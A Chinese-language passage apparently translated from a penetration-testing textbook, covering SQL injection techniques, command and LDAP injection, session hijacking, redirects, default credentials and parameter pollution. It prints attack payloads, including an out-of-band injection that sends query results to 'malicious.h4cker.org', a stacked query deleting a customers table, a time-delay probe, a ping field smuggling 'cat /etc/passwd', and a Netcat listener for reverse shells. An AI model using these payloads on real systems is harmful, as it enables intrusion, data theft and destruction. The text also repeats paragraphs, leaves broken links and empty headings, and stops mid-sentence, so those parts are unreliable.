
为了成功执行复杂查询并利用不同的 SQL 注入组合，你必须对数据库进行指纹识别。SQL 语言在 ISO/IEC 9075 标准中定义。然而，数据库在执行额外命令的能力、使用函数检索数据以及与其他特征方面存在差异。进行更高级的 SQL 注入攻击时，攻击者需要知道应用程序使用的是什么后端数据库（例如 Oracle、MariaDB、MySQL、PostgreSQL）。

识别数据库指纹简单的方法之一是密切关注应用程序返回的任何错误，如下 MySQL 数据库的语法错误消息所示：

```
MySQL Error 1064: You have an error in your SQL syntax
```

### Note

你可以从 [`dev.mysql.com/doc/refman/8.0/en/error-handling.html`](https://dev.mysql.com/doc/refman/8.0/en/error-handling.html) 获取有关 MySQL 错误消息的详细信息。

以下来自 Microsoft SQL 数据库的错误：

```
Unclosed quotation mark after the '
```

以下是 Microsoft SQL Server 的 ASP 错误消息：

```
Server Error in '/'
```

### Note

你可以从 [`docs.microsoft.com/en-us/azure/sql-database/develop-error-messages`](https://docs.microsoft.com/en-us/azure/sql-database/develop-error-messages) 获取有关 SQL Server 错误的额外信息。

以下是来自 Oracle 数据库的错误：

```
ORA-0933: SQL command not ended
```

### Note

你可以从 [`docs.oracle.com/database/121/BRMAN/error`](https://docs.oracle.com/database/121/BRMAN/error) 查询 Oracle 错误代码。

以下是来自 PostgreSQL 数据库的错误：

```
PSQLException: ERROR: unterminated quoted string at or
"'" Position: 1
```

# 图 6-12 盲 SQL 注入攻击示例

**提示**

尝试通过下载 DVWA 或在 [websploit.org](http://websploit.org) 部署 WebSploit Labs 来尝试。

## 带外利用 (Out-of-Band)

在利用盲 SQL 注入漏洞时，带外利用技术非常有用。你可以使用数据库管理系统 (DBMS) 函数执行带外连接，以获取盲 SQL 注入攻击的结果。图 6-13 显示了攻击者如何利用 [store.h4cker.org](http://store.h4cker.org) 盲 SQL 注入漏洞，然后强制受害者服务器将查询结果（受攻击的数据）发送到另一台服务器（[malicious.h4cker.org](http://malicious.h4cker.org)）。

![FIGURE6-13 带外攻击示例](img/06fig13.jpg)

**图 6-13** 带外攻击示例

假设恶意 SQL 字符串如下：

```
https://store.h4cker.org/buyme.php?id=8||UTL_HTTP.request('malicious.
h4cker.org')||(SELECT user FROM DUAL)--
```

在此示例中，攻击者使用了值`8`结合 Oracle 函数`UTL_HTTP.request`的执行结果。

**提示**

要执行此攻击，你可以设置如 NGINX 或 Apache 等 Web 服务器，或使用 Netcat 启动监听器（例如`nc -lvp 80`）。Netcat 在渗透测试中最常见的用途之一是创建反向 shell 和绑定 shell。*反向 shell (reverse shell)* 是从受害者系统发起的攻击者的 shell。绑定 shell (bind shell) 设置在受害者上并“绑定”到特定端口以监听来自攻击者的入站连接。绑定 shell 通常被称为*后门 (backdoor)*。

有关可以帮助你熟悉不同其他用命令和工具（包括 Netcat）的备查表，请参 [`h4cker.org/cheat`](http://h4cker.org/cheat)。你将在第 8 章“执行利用后技术”中学习更多关于 Netcat 以及反向 shell 和绑定 shell 的知识。

## 叠加查询 (Stacked Queries)

在标准的 SQL 查询中，你可以使用分号指定语句结束，后续内容是一个新语句。这种技术允许你在同次数据库调用中执行多个语句。SQL 注入攻击中使用的`UNION`查询限于`SELECT`语句。然而，叠加查询可用于执行任何 SQL 语句或过程。使用此技术的典型攻击可以指定如下的恶意输入语句：

```
1; DELETE FROM customers
```

受漏洞的应用程序和数据库会将此语句处理为如下 SQL 查询：

```
SELECT * FROM customers WHERE customer_id=1; DELETE FROM customers
```

## 时间延迟 SQL 注入技术

在尝试利用盲 SQL 注入时，布尔技术非常有用。另一个技巧是也诱导响应产生延迟，这表明条件查询的结果为真。

**注意**

时间延迟技术因不同的数据库类型/厂商而异。

以下是针对 MySQL 服务器使用时间延迟技术的示例：

```
https://store.h4cker.org/buyme.php?id=8 AND IF(version() like '8%',
sleep(10), 'false'))--
```

在此示例中，查询检查 MySQL 版本是否为 8.x，然后强制服务器延迟 10 秒回答答案。攻击者可以增加延迟时间并监控响应。攻击者甚至可以将`sleep`参数设置为高值，因为不需要等待那么久，只需在几秒后取消请求即可。

## 存储过程 SQL 注入抽查

*存储过程 (stored procedure)* 是一个或多个 SQL 语句或对 SQL 服务器的引用。存储过程可以接受输入参数，并输出参数的形式向调用程序返回多个值。它们还可以包含在数据库中执行操作的编程语句（包括调用其他过程）。

如果 SQL 服务器没有对用户输入进行清理，则可能输入在存储过程中执行的恶意 SQL 语句。下面的示例说明了存储过程的概念：

```
Create procedure user_login @username varchar(20), @passwd
varchar(20) As Declare @sqlstring varchar(250) Set @sqlstring = '
Select 1 from users Where username = ' + @username + ' and passwd = '
+ @passwd exec(@sqlstring) Go
```

在输入未清理的漏洞应用程序中输入`omar or 1=1' somepassword`，攻击者可以获取密码或其他敏感信息。

**注意**

在第 10 章中，你将学习 Burp Suite、BeEF 和`sqlmap`等工具，它们可以帮助发现 SQL 漏洞。你可以使用`sqlmap`自动化 SQL 注入。SQLmap 默认安装在 Kali Linux 和 Parrot OS 中。此外，你可以从 [`sqlmap.org`](https://sqlmap.org) 下载。

## SQL 注入缓解

输入验证是缓解 SQL 注入的重要部分。缓解 SQL 注入的最佳措施是使用静态查询，例如：

*   静态查询
*   参数化查询
*   存储过程（如果不生成动态 SQL 的）

静态查询不包含会被解析的数据。在某些情况下，它们将数据作为绑定到列的单个实体处理。

以下是静态查询的示例：

```
select * from contacts;
select * from users where user = "omar";
```

以下是参数化查询的示例：

```
String query = "SELECT * FROM users WHERE name = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, username);
ResultSet results = statement.executeQuery();
```

## 命令注入漏洞

命令注入是一种攻击者尝试通过漏洞应用程序执行其不应能够执行的命令的攻击。当应用程序未对用户提供的数据进行验证时（例如 Web 表单、Cookie、HTTP 头部和其他元素中输入的数据），就会发生命令注入攻击。漏洞系统会将该数据传递到系统 shell 中。

通过命令注入，攻击者尝试发送操作系统命令，以便应用程序以漏洞应用程序的权限执行这些命令。

命令注入与代码执行以及代码注入不同，后者涉及利用缓冲区溢出或类似的漏洞。

针对 Web 应用程序的命令注入不再以前那样流行了，因为现代应用程序框架对此类攻击有更好的防御能力。图 6-14 展示了一个使用故意存在漏洞的 DVWA 应用进行命令注入的示例。

在图 6-14 中，网站允许用户输入 IP 地址以对该 IP 进行 ping 测试，但攻击者输入字符串`192.168.78.6;cat /etc/passwd`，导致应用程序显示`/etc/passwd`文件的内容。

![FIGURE 6-14 命令注入漏洞示例](img/06fig14.jpg)

**图 6-14** 命令注入漏洞示例

## Note

OWASP 在 [`www.owasp.org/index.php/Command\_Injection`](https://www.owasp.org/index.php/Command_Injection) 中对命令注入的工作原理提供了良好的解释。

## 轻量级目录访问协议 (LDAP) 注入漏洞

`LDAP injection vulnerabilities`是一种输入验证漏洞，攻击者利用该漏洞向 LDAP 服务器注入并执行查询。成功的`LDAP 注入`攻击可以允许攻击者获取价值信息，以便对数据库和内部应用程序进行进一步攻击。

## Note

LDAP 是一种开放的应用协议，许多组织使用它来访问和维护网络目录服务。LDAP 协议定义在 RFC 4511 中。

与 SQL 注入和其他注入攻击类似，LDAP 注入攻击利用应用程序将未清洗的用户输入（即未验证的输入）直接插入 LDAP 语句时产生的漏洞。通过发送构造的 LDAP 数据包，攻击者可以导致 LDAP 服务器执行各种查询和其他 LDAP 语句。例如，LDAP 注入漏洞允许攻击者修改 LDAP 树和业务关键信息。

LDAP 注入攻击通有两种类型：

*   **身份验证绕过：** 最基本的 LDAP 注入攻击旨在绕过密码和凭据检查。
*   **信息泄露：** 攻击者可以构造构造 LDAP 数据包来列出组织目录中的所有资源并进行侦察。

## 利用基于身份验证的漏洞

攻击者可以使用几种方法绕过受漏洞系统中的身份验证。以下是受影响系统中利用基于身份验证漏洞的最常见方法：

*   凭据暴力破解
*   会话劫持
*   重定向
*   利用默认凭据
*   利用弱凭据
*   利用 Kerberos

### 会话劫持

Web 会话是 Web 客户端与服务器之间的 HTTP 请求和响应序列。该过程包括图 6-15 所示的步骤。

![FIGURE 6-15 Web 会话的高层过程](img/06fig15.jpg)

**图 6-15** Web 会话的高层过程

大量的 Web 应用程序在整个事务期间跟踪每个用户的信息。某些 Web 应用程序能够建立访问权限和进程等变量。`图 6-15](#ch06.xhtml#ch06fig15)`显示了 Web 会话的高层过程。

大量的 Web 应用程序在整个事务期间跟踪每个用户的信息。某些 Web 应用程序能够建立访问权限等变量。`图 6-15](#ch06.xhtml#ch06fig15)`显示了。

**图 6-15** Web 会话的高层过程

大量的 Web 应用程序在整个事务期间跟踪每个用户的信息。某些 Web 应用程序能够建立访问权限等变量。

## Note

OWASP 在 [`www.owasp.org/index.php/Command\_Injection`](https://www.owasp.org/index.php/Command_Injection) 中对命令注入的工作原理提供了良好的解释。

## Note

建议使用这些内置框架而不是从零开始构建，因为它们已经经过了许多人的测试。遗憾的是，当你进行渗透测试时，可能会发现人们正尝试创建自己的框架。

这显而易见，但你必须使用 HTTPS 加密整个 Web 会话——不仅是为了交换用户凭据的身份验证过程，还为了确保会话 ID 仅通过加密通道交换。使用加密通信通道还可以保护会话免某些会话固定攻击，在这些攻击中，攻击者能够拦截并操纵 Web 流量，在害者的 Web 浏览器中注入（或固定）会话 ID。

Cookie 有两种：非持久性（会话）Cookie 和持久性 Cookie。如果 Cookie 具有`Max-Age`或`Expires`属性，则被认为是持久性 Cookie，并由 Web 浏览器存储在磁盘上直到过期时间。

配置带有`HTTPOnly`标记的 cookie 会强制浏览器仅由服务器处理此 cookie，并严格禁止任何从客户端代码或脚本访问该 cookie 的尝试。这可以防止包括 CSRF 在内的多种攻击。

**提示**

现代应用程序通常在身份验证后使用非持久化 cookie 来跟踪用户。这强制在当前 Web 浏览器实例关闭时从客户端中删除会话信息。这就是为什么使用非持久化 cookie 如此关重要：这样 session ID 不会在 Web 客户端缓存中长时间留。此外，这也是为什么在本章前面提到的，验证和校验 session ID 是至关重要的。

攻击者有多种方法可以执行会话劫持，会话令牌也有多种可能被破坏的方式：

*   **预测会话令牌：** 正如本节之前讨论的，这就是为什么使用不可预测的令牌至关重要。
*   **会话嗅探：** 这可以通过收集未加密的 Web 会话数据包发生。
*   **路径攻击（以前称为中间人攻击）：** 在此类攻击中，攻击者位于客户端和 Web 服务器之间的路径上。此外，浏览器（或扩展或插件）可能被攻破并用于拦截和操纵用户与 Web 服务器之间的 Web 会话。这种基于浏览器的攻击被称为浏览器中间人攻击。

如果 Web 应用程序不验证并过滤无效的 session ID 值，它们可能被用于利用其他 Web 漏洞，例如 SQL 注入（如果 session ID 存储在关系型数据库中）或持久型 XSS（如果 session ID 被存储并随后由 Web 应用程序回显）。

**注意**

XSS 将在本章稍后部分介绍。

### 重定向攻击

未验证的重定向和转发是攻击者可以用来攻击 Web 应用程序及其客户端的漏洞。当 Web 服务器接受不可信输入，且该输入导致 Web 应用程序将请求重定向到不可信输入中的 URL 时，攻击者就可以利用此类漏洞。攻击者可以修改不可信的 URL 输入并将用户重定向到恶意网站，以安装恶意软件或窃取敏感信息。

利用未验证的重定向和转发漏洞构造可以绕过应用程序访问控制检查的 URL。这允许攻击者访问其通常不被允许访问的权限功能。

**注意**

未验证的重定向和转发攻击通常需要一些社会工程学手段。

### 默认凭据

安全行业的一句常用谚是：“如果你有默认密码，为什么还需要黑客呢？”许多组织和个人将路由器、交换机、无线访问点甚至防火墙等基础设施设备配置为使用默认密码。

攻击者可以轻松地识别并访问使用共享默认密码的系统。始终更改制造商的默认密码并限制对关键系统的访问是至关重要的。许多制造商现在要求用户在初始设置期间更改默认密码，但有些厂家并没有这么做。

攻击者可以轻松地获取默认密码并识别连接到互联网的目标系统。密码可以在产品文档和互联网上提供的编译列表中找到。例如`http://www.defaultpassword.com`，但还有几十个其他包含默认密码的网站。

### 利用基于授权的漏洞

### Kerberos 漏洞

在第 5 章中，你学习了 Kerberos 身份验证过程。然而，如果被滥用，可能会产生负面后果。

Kerberos 的另一个弱点是无限制委托，它允许用户访问资源。通常，你应该关闭 Kerberos 委托。

**注意**

有关 Kerberos 许可票据 (KRGT) 的更多信息，请参考第 5 章。

### 参数污染

如果多个 HTTP 参数具有相同的名称，就可能会引入 HTTP 参数污染 (HPP)。此问题可能导致应用程序错误地解释值。攻击者可以通过寻找允许用户提供输入的表单或操作来发现 HPP 漏洞。然后，攻击者可以在**GET**或**POST**数据中附加相同的参数——但使用不同的值。

考虑以下 URL：

`https://store.hacker.org/?search=cars`

该 URL 具有查询字符串`search=cars`。攻击者可以保留当前参数并附加一个重复项，所示：
